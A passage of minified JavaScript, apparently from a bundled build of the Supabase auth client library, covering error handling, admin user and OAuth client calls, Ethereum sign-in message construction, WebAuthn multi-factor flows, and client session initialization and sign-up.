a=0,s=Object.getOwnPropertySymbols(n);a<s.length;a++)e.indexOf(s[a])<0&&Object.prototype.propertyIsEnumerable.call(n,s[a])&&(r[s[a]]=n[s[a]]);return r};const fr=n=>n.msg||n.message||n.error_description||n.error||JSON.stringify(n),nC=[502,503,504];async function Xg(n){var e;if(!WA(n))throw new Ru(fr(n),0);if(nC.includes(n.status))throw new Ru(fr(n),n.status);let r;try{r=await n.json()}catch(l){throw new mr(fr(l),l)}let s;const a=YA(n);if(a&&a.getTime()>=Bb["2024-01-01"].timestamp&&typeof r=="object"&&r&&typeof r.code=="string"?s=r.code:typeof r=="object"&&r&&typeof r.error_code=="string"&&(s=r.error_code),s){if(s==="weak_password")throw new Gg(fr(r),n.status,((e=r.weak_password)===null||e===void 0?void 0:e.reasons)||[]);if(s==="session_not_found")throw new Un}else if(typeof r=="object"&&r&&typeof r.weak_password=="object"&&r.weak_password&&Array.isArray(r.weak_password.reasons)&&r.weak_password.reasons.length&&r.weak_password.reasons.reduce((l,c)=>l&&typeof c=="string",!0))throw new Gg(fr(r),n.status,r.weak_password.reasons);throw new RA(fr(r),n.status||500,s)}const rC=(n,e,r,s)=>{const a={method:n,headers:e?.headers||{}};return n==="GET"?a:(a.headers=Object.assign({"Content-Type":"application/json;charset=UTF-8"},e?.headers),a.body=JSON.stringify(s),Object.assign(Object.assign({},a),r))};async function de(n,e,r,s){var a;const l=Object.assign({},s?.headers);l[Iu]||(l[Iu]=Bb["2024-01-01"].name),s?.jwt&&(l.Authorization=`Bearer ${s.jwt}`);const c=(a=s?.query)!==null&&a!==void 0?a:{};s?.redirectTo&&(c.redirect_to=s.redirectTo);const d=Object.keys(c).length?"?"+new URLSearchParams(c).toString():"",p=await iC(n,e,r+d,{headers:l,noResolveJson:s?.noResolveJson},{},s?.body);return s?.xform?s?.xform(p):{data:Object.assign({},p),error:null}}async function iC(n,e,r,s,a,l){const c=rC(e,s,a,l);let d;try{d=await n(r,Object.assign({},c))}catch(p){throw console.error(p),new Ru(fr(p),0)}if(d.ok||await Xg(d),s?.noResolveJson)return d;try{return await d.json()}catch(p){await Xg(p)}}function qt(n){var e;let r=null;aC(n)&&(r=Object.assign({},n),n.expires_at||(r.expires_at=UA(n.expires_in)));const s=(e=n.user)!==null&&e!==void 0?e:n;return{data:{session:r,user:s},error:null}}function Zg(n){const e=qt(n);return!e.error&&n.weak_password&&typeof n.weak_password=="object"&&Array.isArray(n.weak_password.reasons)&&n.weak_password.reasons.length&&n.weak_password.message&&typeof n.weak_password.message=="string"&&n.weak_password.reasons.reduce((r,s)=>r&&typeof s=="string",!0)&&(e.data.weak_password=n.weak_password),e}function Vn(n){var e;return{data:{user:(e=n.user)!==null&&e!==void 0?e:n},error:null}}function sC(n){return{data:n,error:null}}function oC(n){const{action_link:e,email_otp:r,hashed_token:s,redirect_to:a,verification_type:l}=n,c=tC(n,["action_link","email_otp","hashed_token","redirect_to","verification_type"]),d={action_link:e,email_otp:r,hashed_token:s,redirect_to:a,verification_type:l},p=Object.assign({},c);return{data:{properties:d,user:p},error:null}}function em(n){return n}function aC(n){return n.access_token&&n.refresh_token&&n.expires_in}const tu=["global","local","others"];var lC=function(n,e){var r={};for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&e.indexOf(s)<0&&(r[s]=n[s]);if(n!=null&&typeof Object.getOwnPropertySymbols=="function")for(var a=0,s=Object.getOwnPropertySymbols(n);a<s.length;a++)e.indexOf(s[a])<0&&Object.prototype.propertyIsEnumerable.call(n,s[a])&&(r[s[a]]=n[s[a]]);return r};class cC{constructor({url:e="",headers:r={},fetch:s}){this.url=e,this.headers=r,this.fetch=Fb(s),this.mfa={listFactors:this._listFactors.bind(this),deleteFactor:this._deleteFactor.bind(this)},this.oauth={listClients:this._listOAuthClients.bind(this),createClient:this._createOAuthClient.bind(this),getClient:this._getOAuthClient.bind(this),deleteClient:this._deleteOAuthClient.bind(this),regenerateClientSecret:this._regenerateOAuthClientSecret.bind(this)}}async signOut(e,r=tu[0]){if(tu.indexOf(r)<0)throw new Error(`@supabase/auth-js: Parameter scope must be one of ${tu.join(", ")}`);try{return await de(this.fetch,"POST",`${this.url}/logout?scope=${r}`,{headers:this.headers,jwt:e,noResolveJson:!0}),{data:null,error:null}}catch(s){if(oe(s))return{data:null,error:s};throw s}}async inviteUserByEmail(e,r={}){try{return await de(this.fetch,"POST",`${this.url}/invite`,{body:{email:e,data:r.data},headers:this.headers,redirectTo:r.redirectTo,xform:Vn})}catch(s){if(oe(s))return{data:{user:null},error:s};throw s}}async generateLink(e){try{const{options:r}=e,s=lC(e,["options"]),a=Object.assign(Object.assign({},s),r);return"newEmail"in s&&(a.new_email=s?.newEmail,delete a.newEmail),await de(this.fetch,"POST",`${this.url}/admin/generate_link`,{body:a,headers:this.headers,xform:oC,redirectTo:r?.redirectTo})}catch(r){if(oe(r))return{data:{properties:null,user:null},error:r};throw r}}async createUser(e){try{return await de(this.fetch,"POST",`${this.url}/admin/users`,{body:e,headers:this.headers,xform:Vn})}catch(r){if(oe(r))return{data:{user:null},error:r};throw r}}async listUsers(e){var r,s,a,l,c,d,p;try{const f={nextPage:null,lastPage:0,total:0},m=await de(this.fetch,"GET",`${this.url}/admin/users`,{headers:this.headers,noResolveJson:!0,query:{page:(s=(r=e?.page)===null||r===void 0?void 0:r.toString())!==null&&s!==void 0?s:"",per_page:(l=(a=e?.perPage)===null||a===void 0?void 0:a.toString())!==null&&l!==void 0?l:""},xform:em});if(m.error)throw m.error;const y=await m.json(),v=(c=m.headers.get("x-total-count"))!==null&&c!==void 0?c:0,w=(p=(d=m.headers.get("link"))===null||d===void 0?void 0:d.split(","))!==null&&p!==void 0?p:[];return w.length>0&&(w.forEach(A=>{const k=parseInt(A.split(";")[0].split("=")[1].substring(0,1)),x=JSON.parse(A.split(";")[1].split("=")[1]);f[`${x}Page`]=k}),f.total=parseInt(v)),{data:Object.assign(Object.assign({},y),f),error:null}}catch(f){if(oe(f))return{data:{users:[]},error:f};throw f}}async getUserById(e){oi(e);try{return await de(this.fetch,"GET",`${this.url}/admin/users/${e}`,{headers:this.headers,xform:Vn})}catch(r){if(oe(r))return{data:{user:null},error:r};throw r}}async updateUserById(e,r){oi(e);try{return await de(this.fetch,"PUT",`${this.url}/admin/users/${e}`,{body:r,headers:this.headers,xform:Vn})}catch(s){if(oe(s))return{data:{user:null},error:s};throw s}}async deleteUser(e,r=!1){oi(e);try{return await de(this.fetch,"DELETE",`${this.url}/admin/users/${e}`,{headers:this.headers,body:{should_soft_delete:r},xform:Vn})}catch(s){if(oe(s))return{data:{user:null},error:s};throw s}}async _listFactors(e){oi(e.userId);try{const{data:r,error:s}=await de(this.fetch,"GET",`${this.url}/admin/users/${e.userId}/factors`,{headers:this.headers,xform:a=>({data:{factors:a},error:null})});return{data:r,error:s}}catch(r){if(oe(r))return{data:null,error:r};throw r}}async _deleteFactor(e){oi(e.userId),oi(e.id);try{return{data:await de(this.fetch,"DELETE",`${this.url}/admin/users/${e.userId}/factors/${e.id}`,{headers:this.headers}),error:null}}catch(r){if(oe(r))return{data:null,error:r};throw r}}async _listOAuthClients(e){var r,s,a,l,c,d,p;try{const f={nextPage:null,lastPage:0,total:0},m=await de(this.fetch,"GET",`${this.url}/admin/oauth/clients`,{headers:this.headers,noResolveJson:!0,query:{page:(s=(r=e?.page)===null||r===void 0?void 0:r.toString())!==null&&s!==void 0?s:"",per_page:(l=(a=e?.perPage)===null||a===void 0?void 0:a.toString())!==null&&l!==void 0?l:""},xform:em});if(m.error)throw m.error;const y=await m.json(),v=(c=m.headers.get("x-total-count"))!==null&&c!==void 0?c:0,w=(p=(d=m.headers.get("link"))===null||d===void 0?void 0:d.split(","))!==null&&p!==void 0?p:[];return w.length>0&&(w.forEach(A=>{const k=parseInt(A.split(";")[0].split("=")[1].substring(0,1)),x=JSON.parse(A.split(";")[1].split("=")[1]);f[`${x}Page`]=k}),f.total=parseInt(v)),{data:Object.assign(Object.assign({},y),f),error:null}}catch(f){if(oe(f))return{data:{clients:[]},error:f};throw f}}async _createOAuthClient(e){try{return await de(this.fetch,"POST",`${this.url}/admin/oauth/clients`,{body:e,headers:this.headers,xform:r=>({data:r,error:null})})}catch(r){if(oe(r))return{data:null,error:r};throw r}}async _getOAuthClient(e){try{return await de(this.fetch,"GET",`${this.url}/admin/oauth/clients/${e}`,{headers:this.headers,xform:r=>({data:r,error:null})})}catch(r){if(oe(r))return{data:null,error:r};throw r}}async _deleteOAuthClient(e){try{return await de(this.fetch,"DELETE",`${this.url}/admin/oauth/clients/${e}`,{headers:this.headers,xform:r=>({data:r,error:null})})}catch(r){if(oe(r))return{data:null,error:r};throw r}}async _regenerateOAuthClientSecret(e){try{return await de(this.fetch,"POST",`${this.url}/admin/oauth/clients/${e}/regenerate_secret`,{headers:this.headers,xform:r=>({data:r,error:null})})}catch(r){if(oe(r))return{data:null,error:r};throw r}}}function tm(n={}){return{getItem:e=>n[e]||null,setItem:(e,r)=>{n[e]=r},removeItem:e=>{delete n[e]}}}const ai={debug:!!(globalThis&&Lb()&&globalThis.localStorage&&globalThis.localStorage.getItem("supabase.gotrue-js.locks.debug")==="true")};class Ub extends Error{constructor(e){super(e),this.isAcquireTimeout=!0}}class uC extends Ub{}async function dC(n,e,r){ai.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquire lock",n,e);const s=new globalThis.AbortController;return e>0&&setTimeout(()=>{s.abort(),ai.debug&&console.log("@supabase/gotrue-js: navigatorLock acquire timed out",n)},e),await Promise.resolve().then(()=>globalThis.navigator.locks.request(n,e===0?{mode:"exclusive",ifAvailable:!0}:{mode:"exclusive",signal:s.signal},async a=>{if(a){ai.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquired",n,a.name);try{return await r()}finally{ai.debug&&console.log("@supabase/gotrue-js: navigatorLock: released",n,a.name)}}else{if(e===0)throw ai.debug&&console.log("@supabase/gotrue-js: navigatorLock: not immediately available",n),new uC(`Acquiring an exclusive Navigator LockManager lock "${n}" immediately failed`);if(ai.debug)try{const l=await globalThis.navigator.locks.query();console.log("@supabase/gotrue-js: Navigator LockManager state",JSON.stringify(l,null,"  "))}catch(l){console.warn("@supabase/gotrue-js: Error when querying Navigator LockManager state",l)}return console.warn("@supabase/gotrue-js: Navigator LockManager returned a null lock when using #request without ifAvailable set to true, it appears this browser is not following the LockManager spec https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request"),await r()}}))}function hC(){if(typeof globalThis!="object")try{Object.defineProperty(Object.prototype,"__magic__",{get:function(){return this},configurable:!0}),__magic__.globalThis=__magic__,delete Object.prototype.__magic__}catch{typeof self<"u"&&(self.globalThis=self)}}function zb(n){if(!/^0x[a-fA-F0-9]{40}$/.test(n))throw new Error(`@supabase/auth-js: Address "${n}" is invalid.`);return n.toLowerCase()}function pC(n){return parseInt(n,16)}function fC(n){const e=new TextEncoder().encode(n);return"0x"+Array.from(e,s=>s.toString(16).padStart(2,"0")).join("")}function gC(n){var e;const{chainId:r,domain:s,expirationTime:a,issuedAt:l=new Date,nonce:c,notBefore:d,requestId:p,resources:f,scheme:m,uri:y,version:v}=n;{if(!Number.isInteger(r))throw new Error(`@supabase/auth-js: Invalid SIWE message field "chainId". Chain ID must be a EIP-155 chain ID. Provided value: ${r}`);if(!s)throw new Error('@supabase/auth-js: Invalid SIWE message field "domain". Domain must be provided.');if(c&&c.length<8)throw new Error(`@supabase/auth-js: Invalid SIWE message field "nonce". Nonce must be at least 8 characters. Provided value: ${c}`);if(!y)throw new Error('@supabase/auth-js: Invalid SIWE message field "uri". URI must be provided.');if(v!=="1")throw new Error(`@supabase/auth-js: Invalid SIWE message field "version". Version must be '1'. Provided value: ${v}`);if(!((e=n.statement)===null||e===void 0)&&e.includes(`
`))throw new Error(`@supabase/auth-js: Invalid SIWE message field "statement". Statement must not include '\\n'. Provided value: ${n.statement}`)}const w=zb(n.address),A=m?`${m}://${s}`:s,k=n.statement?`${n.statement}
`:"",x=`${A} wants you to sign in with your Ethereum account:
${w}

${k}`;let B=`URI: ${y}
Version: ${v}
Chain ID: ${r}${c?`
Nonce: ${c}`:""}
Issued At: ${l.toISOString()}`;if(a&&(B+=`
Expiration Time: ${a.toISOString()}`),d&&(B+=`
Not Before: ${d.toISOString()}`),p&&(B+=`
Request ID: ${p}`),f){let _=`
Resources:`;for(const P of f){if(!P||typeof P!="string")throw new Error(`@supabase/auth-js: Invalid SIWE message field "resources". Every resource must be a valid string. Provided value: ${P}`);_+=`
- ${P}`}B+=_}return`${x}
${B}`}class He extends Error{constructor({message:e,code:r,cause:s,name:a}){var l;super(e,{cause:s}),this.__isWebAuthnError=!0,this.name=(l=a??(s instanceof Error?s.name:void 0))!==null&&l!==void 0?l:"Unknown Error",this.code=r}}class ba extends He{constructor(e,r){super({code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:r,message:e}),this.name="WebAuthnUnknownError",this.originalError=r}}function mC({error:n,options:e}){var r,s,a;const{publicKey:l}=e;if(!l)throw Error("options was missing required publicKey property");if(n.name==="AbortError"){if(e.signal instanceof AbortSignal)return new He({message:"Registration ceremony was sent an abort signal",code:"ERROR_CEREMONY_ABORTED",cause:n})}else if(n.name==="ConstraintError"){if(((r=l.authenticatorSelection)===null||r===void 0?void 0:r.requireResidentKey)===!0)return new He({message:"Discoverable credentials were required but no available authenticator supported it",code:"ERROR_AUTHENTICATOR_MISSING_DISCOVERABLE_CREDENTIAL_SUPPORT",cause:n});if(e.mediation==="conditional"&&((s=l.authenticatorSelection)===null||s===void 0?void 0:s.userVerification)==="required")return new He({message:"User verification was required during automatic registration but it could not be performed",code:"ERROR_AUTO_REGISTER_USER_VERIFICATION_FAILURE",cause:n});if(((a=l.authenticatorSelection)===null||a===void 0?void 0:a.userVerification)==="required")return new He({message:"User verification was required but no available authenticator supported it",code:"ERROR_AUTHENTICATOR_MISSING_USER_VERIFICATION_SUPPORT",cause:n})}else{if(n.name==="InvalidStateError")return new He({message:"The authenticator was previously registered",code:"ERROR_AUTHENTICATOR_PREVIOUSLY_REGISTERED",cause:n});if(n.name==="NotAllowedError")return new He({message:n.message,code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:n});if(n.name==="NotSupportedError")return l.pubKeyCredParams.filter(d=>d.type==="public-key").length===0?new He({message:'No entry in pubKeyCredParams was of type "public-key"',code:"ERROR_MALFORMED_PUBKEYCREDPARAMS",cause:n}):new He({message:"No available authenticator supported any of the specified pubKeyCredParams algorithms",code:"ERROR_AUTHENTICATOR_NO_SUPPORTED_PUBKEYCREDPARAMS_ALG",cause:n});if(n.name==="SecurityError"){const c=window.location.hostname;if(Wb(c)){if(l.rp.id!==c)return new He({message:`The RP ID "${l.rp.id}" is invalid for this domain`,code:"ERROR_INVALID_RP_ID",cause:n})}else return new He({message:`${window.location.hostname} is an invalid domain`,code:"ERROR_INVALID_DOMAIN",cause:n})}else if(n.name==="TypeError"){if(l.user.id.byteLength<1||l.user.id.byteLength>64)return new He({message:"User ID was not between 1 and 64 characters",code:"ERROR_INVALID_USER_ID_LENGTH",cause:n})}else if(n.name==="UnknownError")return new He({message:"The authenticator was unable to process the specified options, or could not create a new credential",code:"ERROR_AUTHENTICATOR_GENERAL_ERROR",cause:n})}return new He({message:"a Non-Webauthn related error has occurred",code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:n})}function yC({error:n,options:e}){const{publicKey:r}=e;if(!r)throw Error("options was missing required publicKey property");if(n.name==="AbortError"){if(e.signal instanceof AbortSignal)return new He({message:"Authentication ceremony was sent an abort signal",code:"ERROR_CEREMONY_ABORTED",cause:n})}else{if(n.name==="NotAllowedError")return new He({message:n.message,code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:n});if(n.name==="SecurityError"){const s=window.location.hostname;if(Wb(s)){if(r.rpId!==s)return new He({message:`The RP ID "${r.rpId}" is invalid for this domain`,code:"ERROR_INVALID_RP_ID",cause:n})}else return new He({message:`${window.location.hostname} is an invalid domain`,code:"ERROR_INVALID_DOMAIN",cause:n})}else if(n.name==="UnknownError")return new He({message:"The authenticator was unable to process the specified options, or could not create a new assertion signature",code:"ERROR_AUTHENTICATOR_GENERAL_ERROR",cause:n})}return new He({message:"a Non-Webauthn related error has occurred",code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:n})}var Vb=function(n,e){var r={};for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&e.indexOf(s)<0&&(r[s]=n[s]);if(n!=null&&typeof Object.getOwnPropertySymbols=="function")for(var a=0,s=Object.getOwnPropertySymbols(n);a<s.length;a++)e.indexOf(s[a])<0&&Object.prototype.propertyIsEnumerable.call(n,s[a])&&(r[s[a]]=n[s[a]]);return r};class bC{createNewAbortSignal(){if(this.controller){const r=new Error("Cancelling existing WebAuthn API call for new one");r.name="AbortError",this.controller.abort(r)}const e=new AbortController;return this.controller=e,e.signal}cancelCeremony(){if(this.controller){const e=new Error("Manually cancelling existing WebAuthn API call");e.name="AbortError",this.controller.abort(e),this.controller=void 0}}}const vC=new bC;function wC(n){if(!n)throw new Error("Credential creation options are required");if(typeof PublicKeyCredential<"u"&&"parseCreationOptionsFromJSON"in PublicKeyCredential&&typeof PublicKeyCredential.parseCreationOptionsFromJSON=="function")return PublicKeyCredential.parseCreationOptionsFromJSON(n);const{challenge:e,user:r,excludeCredentials:s}=n,a=Vb(n,["challenge","user","excludeCredentials"]),l=gi(e).buffer,c=Object.assign(Object.assign({},r),{id:gi(r.id).buffer}),d=Object.assign(Object.assign({},a),{challenge:l,user:c});if(s&&s.length>0){d.excludeCredentials=new Array(s.length);for(let p=0;p<s.length;p++){const f=s[p];d.excludeCredentials[p]=Object.assign(Object.assign({},f),{id:gi(f.id).buffer,type:f.type||"public-key",transports:f.transports})}}return d}function kC(n){if(!n)throw new Error("Credential request options are required");if(typeof PublicKeyCredential<"u"&&"parseRequestOptionsFromJSON"in PublicKeyCredential&&typeof PublicKeyCredential.parseRequestOptionsFromJSON=="function")return PublicKeyCredential.parseRequestOptionsFromJSON(n);const{challenge:e,allowCredentials:r}=n,s=Vb(n,["challenge","allowCredentials"]),a=gi(e).buffer,l=Object.assign(Object.assign({},s),{challenge:a});if(r&&r.length>0){l.allowCredentials=new Array(r.length);for(let c=0;c<r.length;c++){const d=r[c];l.allowCredentials[c]=Object.assign(Object.assign({},d),{id:gi(d.id).buffer,type:d.type||"public-key",transports:d.transports})}}return l}function xC(n){var e;if("toJSON"in n&&typeof n.toJSON=="function")return n.toJSON();const r=n;return{id:n.id,rawId:n.id,response:{attestationObject:vr(new Uint8Array(n.response.attestationObject)),clientDataJSON:vr(new Uint8Array(n.response.clientDataJSON))},type:"public-key",clientExtensionResults:n.getClientExtensionResults(),authenticatorAttachment:(e=r.authenticatorAttachment)!==null&&e!==void 0?e:void 0}}function SC(n){var e;if("toJSON"in n&&typeof n.toJSON=="function")return n.toJSON();const r=n,s=n.getClientExtensionResults(),a=n.response;return{id:n.id,rawId:n.id,response:{authenticatorData:vr(new Uint8Array(a.authenticatorData)),clientDataJSON:vr(new Uint8Array(a.clientDataJSON)),signature:vr(new Uint8Array(a.signature)),userHandle:a.userHandle?vr(new Uint8Array(a.userHandle)):void 0},type:"public-key",clientExtensionResults:s,authenticatorAttachment:(e=r.authenticatorAttachment)!==null&&e!==void 0?e:void 0}}function Wb(n){return n==="localhost"||/^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i.test(n)}function nm(){var n,e;return!!(Ct()&&"PublicKeyCredential"in window&&window.PublicKeyCredential&&"credentials"in navigator&&typeof((n=navigator?.credentials)===null||n===void 0?void 0:n.create)=="function"&&typeof((e=navigator?.credentials)===null||e===void 0?void 0:e.get)=="function")}async function TC(n){try{const e=await navigator.credentials.create(n);return e?e instanceof PublicKeyCredential?{data:e,error:null}:{data:null,error:new ba("Browser returned unexpected credential type",e)}:{data:null,error:new ba("Empty credential response",e)}}catch(e){return{data:null,error:mC({error:e,options:n})}}}async function AC(n){try{const e=await navigator.credentials.get(n);return e?e instanceof PublicKeyCredential?{data:e,error:null}:{data:null,error:new ba("Browser returned unexpected credential type",e)}:{data:null,error:new ba("Empty credential response",e)}}catch(e){return{data:null,error:yC({error:e,options:n})}}}const CC={hints:["security-key"],authenticatorSelection:{authenticatorAttachment:"cross-platform",requireResidentKey:!1,userVerification:"preferred",residentKey:"discouraged"},attestation:"none"},EC={userVerification:"preferred",hints:["security-key"]};function va(...n){const e=a=>a!==null&&typeof a=="object"&&!Array.isArray(a),r=a=>a instanceof ArrayBuffer||ArrayBuffer.isView(a),s={};for(const a of n)if(a)for(const l in a){const c=a[l];if(c!==void 0)if(Array.isArray(c))s[l]=c;else if(r(c))s[l]=c;else if(e(c)){const d=s[l];e(d)?s[l]=va(d,c):s[l]=va(c)}else s[l]=c}return s}function PC(n,e){return va(CC,n,e||{})}function _C(n,e){return va(EC,n,e||{})}class IC{constructor(e){this.client=e,this.enroll=this._enroll.bind(this),this.challenge=this._challenge.bind(this),this.verify=this._verify.bind(this),this.authenticate=this._authenticate.bind(this),this.register=this._register.bind(this)}async _enroll(e){return this.client.mfa.enroll(Object.assign(Object.assign({},e),{factorType:"webauthn"}))}async _challenge({factorId:e,webauthn:r,friendlyName:s,signal:a},l){try{const{data:c,error:d}=await this.client.mfa.challenge({factorId:e,webauthn:r});if(!c)return{data:null,error:d};const p=a??vC.createNewAbortSignal();if(c.webauthn.type==="create"){const{user:f}=c.webauthn.credential_options.publicKey;f.name||(f.name=`${f.id}:${s}`),f.displayName||(f.displayName=f.name)}switch(c.webauthn.type){case"create":{const f=PC(c.webauthn.credential_options.publicKey,l?.create),{data:m,error:y}=await TC({publicKey:f,signal:p});return m?{data:{factorId:e,challengeId:c.id,webauthn:{type:c.webauthn.type,credential_response:m}},error:null}:{data:null,error:y}}case"request":{const f=_C(c.webauthn.credential_options.publicKey,l?.request),{data:m,error:y}=await AC(Object.assign(Object.assign({},c.webauthn.credential_options),{publicKey:f,signal:p}));return m?{data:{factorId:e,challengeId:c.id,webauthn:{type:c.webauthn.type,credential_response:m}},error:null}:{data:null,error:y}}}}catch(c){return oe(c)?{data:null,error:c}:{data:null,error:new mr("Unexpected error in challenge",c)}}}async _verify({challengeId:e,factorId:r,webauthn:s}){return this.client.mfa.verify({factorId:r,challengeId:e,webauthn:s})}async _authenticate({factorId:e,webauthn:{rpId:r=typeof window<"u"?window.location.hostname:void 0,rpOrigins:s=typeof window<"u"?[window.location.origin]:void 0,signal:a}},l){if(!r)return{data:null,error:new Ts("rpId is required for WebAuthn authentication")};try{if(!nm())return{data:null,error:new mr("Browser does not support WebAuthn",null)};const{data:c,error:d}=await this.challenge({factorId:e,webauthn:{rpId:r,rpOrigins:s},signal:a},{request:l});if(!c)return{data:null,error:d};const{webauthn:p}=c;return this._verify({factorId:e,challengeId:c.challengeId,webauthn:{type:p.type,rpId:r,rpOrigins:s,credential_response:p.credential_response}})}catch(c){return oe(c)?{data:null,error:c}:{data:null,error:new mr("Unexpected error in authenticate",c)}}}async _register({friendlyName:e,rpId:r=typeof window<"u"?window.location.hostname:void 0,rpOrigins:s=typeof window<"u"?[window.location.origin]:void 0,signal:a},l){if(!r)return{data:null,error:new Ts("rpId is required for WebAuthn registration")};try{if(!nm())return{data:null,error:new mr("Browser does not support WebAuthn",null)};const{data:c,error:d}=await this._enroll({friendlyName:e});if(!c)return await this.client.mfa.listFactors().then(m=>{var y;return(y=m.data)===null||y===void 0?void 0:y.all.find(v=>v.factor_type==="webauthn"&&v.friendly_name===e&&v.status!=="unverified")}).then(m=>m?this.client.mfa.unenroll({factorId:m?.id}):void 0),{data:null,error:d};const{data:p,error:f}=await this._challenge({factorId:c.id,friendlyName:c.friendly_name,webauthn:{rpId:r,rpOrigins:s},signal:a},{create:l});return p?this._verify({factorId:c.id,challengeId:p.challengeId,webauthn:{rpId:r,rpOrigins:s,type:p.webauthn.type,credential_response:p.webauthn.credential_response}}):{data:null,error:f}}catch(c){return oe(c)?{data:null,error:c}:{data:null,error:new mr("Unexpected error in register",c)}}}}hC();const RC={url:CA,storageKey:EA,autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,headers:PA,flowType:"implicit",debug:!1,hasCustomAuthorizationHeader:!1};async function rm(n,e,r){return await r()}const li={};class As{get jwks(){var e,r;return(r=(e=li[this.storageKey])===null||e===void 0?void 0:e.jwks)!==null&&r!==void 0?r:{keys:[]}}set jwks(e){li[this.storageKey]=Object.assign(Object.assign({},li[this.storageKey]),{jwks:e})}get jwks_cached_at(){var e,r;return(r=(e=li[this.storageKey])===null||e===void 0?void 0:e.cachedAt)!==null&&r!==void 0?r:Number.MIN_SAFE_INTEGER}set jwks_cached_at(e){li[this.storageKey]=Object.assign(Object.assign({},li[this.storageKey]),{cachedAt:e})}constructor(e){var r,s;this.userStorage=null,this.memoryStorage=null,this.stateChangeEmitters=new Map,this.autoRefreshTicker=null,this.visibilityChangedCallback=null,this.refreshingDeferred=null,this.initializePromise=null,this.detectSessionInUrl=!0,this.hasCustomAuthorizationHeader=!1,this.suppressGetSessionWarning=!1,this.lockAcquired=!1,this.pendingInLock=[],this.broadcastChannel=null,this.logger=console.log,this.instanceID=As.nextInstanceID,As.nextInstanceID+=1,this.instanceID>0&&Ct()&&console.warn("Multiple GoTrueClient instances detected in the same browser context. It is not an error, but this should be avoided as it may produce undefined behavior when used concurrently under the same storage key.");const a=Object.assign(Object.assign({},RC),e);if(this.logDebugMessages=!!a.debug,typeof a.debug=="function"&&(this.logger=a.debug),this.persistSession=a.persistSession,this.storageKey=a.storageKey,this.autoRefreshToken=a.autoRefreshToken,this.admin=new cC({url:a.url,headers:a.headers,fetch:a.fetch}),this.url=a.url,this.headers=a.headers,this.fetch=Fb(a.fetch),this.lock=a.lock||rm,this.detectSessionInUrl=a.detectSessionInUrl,this.flowType=a.flowType,this.hasCustomAuthorizationHeader=a.hasCustomAuthorizationHeader,a.lock?this.lock=a.lock:Ct()&&(!((r=globalThis?.navigator)===null||r===void 0)&&r.locks)?this.lock=dC:this.lock=rm,this.jwks||(this.jwks={keys:[]},this.jwks_cached_at=Number.MIN_SAFE_INTEGER),this.mfa={verify:this._verify.bind(this),enroll:this._enroll.bind(this),unenroll:this._unenroll.bind(this),challenge:this._challenge.bind(this),listFactors:this._listFactors.bind(this),challengeAndVerify:this._challengeAndVerify.bind(this),getAuthenticatorAssuranceLevel:this._getAuthenticatorAssuranceLevel.bind(this),webauthn:new IC(this)},this.persistSession?(a.storage?this.storage=a.storage:Lb()?this.storage=globalThis.localStorage:(this.memoryStorage={},this.storage=tm(this.memoryStorage)),a.userStorage&&(this.userStorage=a.userStorage)):(this.memoryStorage={},this.storage=tm(this.memoryStorage)),Ct()&&globalThis.BroadcastChannel&&this.persistSession&&this.storageKey){try{this.broadcastChannel=new globalThis.BroadcastChannel(this.storageKey)}catch(l){console.error("Failed to create a new BroadcastChannel, multi-tab state changes will not be available",l)}(s=this.broadcastChannel)===null||s===void 0||s.addEventListener("message",async l=>{this._debug("received broadcast notification from other tab or client",l),await this._notifyAllSubscribers(l.data.event,l.data.session,!1)})}this.initialize()}_debug(...e){return this.logDebugMessages&&this.logger(`GoTrueClient@${this.instanceID} (${Mb}) ${new Date().toISOString()}`,...e),this}async initialize(){return this.initializePromise?await this.initializePromise:(this.initializePromise=(async()=>await this._acquireLock(-1,async()=>await this._initialize()))(),await this.initializePromise)}async _initialize(){var e;try{const r=VA(window.location.href);let s="none";if(this._isImplicitGrantCallback(r)?s="implicit":await this._isPKCECallback(r)&&(s="pkce"),Ct()&&this.detectSessionInUrl&&s!=="none"){const{data:a,error:l}=await this._getSessionFromURL(r,s);if(l){if(this._debug("#_initialize()","error detecting session from URL",l),jA(l)){const p=(e=l.details)===null||e===void 0?void 0:e.code;if(p==="identity_already_exists"||p==="identity_not_found"||p==="single_identity_not_deletable")return{error:l}}return await this._removeSession(),{error:l}}const{session:c,redirectType:d}=a;return this._debug("#_initialize()","detected session in URL",c,"redirect type",d),await this._saveSession(c),setTimeout(async()=>{d==="recovery"?await this._notifyAllSubscribers("PASSWORD_RECOVERY",c):await this._notifyAllSubscribers("SIGNED_IN",c)},0),{error:null}}return await this._recoverAndRefresh(),{error:null}}catch(r){return oe(r)?{error:r}:{error:new mr("Unexpected error during initialization",r)}}finally{await this._handleVisibilityChange(),this._debug("#_initialize()","end")}}async signInAnonymously(e){var r,s,a;try{const l=await de(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{data:(s=(r=e?.options)===null||r===void 0?void 0:r.data)!==null&&s!==void 0?s:{},gotrue_meta_security:{captcha_token:(a=e?.options)===null||a===void 0?void 0:a.captchaToken}},xform:qt}),{data:c,error:d}=l;if(d||!c)return{data:{user:null,session:null},error:d};const p=c.session,f=c.user;return c.session&&(await this._saveSession(c.session),await this._notifyAllSubscribers("SIGNED_IN",p)),{data:{user:f,session:p},error:null}}catch(l){if(oe(l))return{data:{user:null,session:null},error:l};throw l}}async signUp(e){var r,s,a;try{let l;if("email"in e){const{email:m,password:y,options:v}=e;let w=null,A=null;this.flowType==="pkce"&&([w,A]=await si(this.storage,this.storageKey)),l=await de(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,redirectTo:v?.emailRedirectTo,body:{email:m,password:y,data:(r=v?.data)!==null&&r!==void 0?r:{},gotrue_meta_security:{captcha_token:v?.captchaToken},code_challenge:w,code_challenge_method:A},xform:qt})}else if("phone"in e){const{phone:m,password:y,options:v}=e;l=await de(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{phone:m,password:y,data:(s=v?.data)!==null&&s!==void 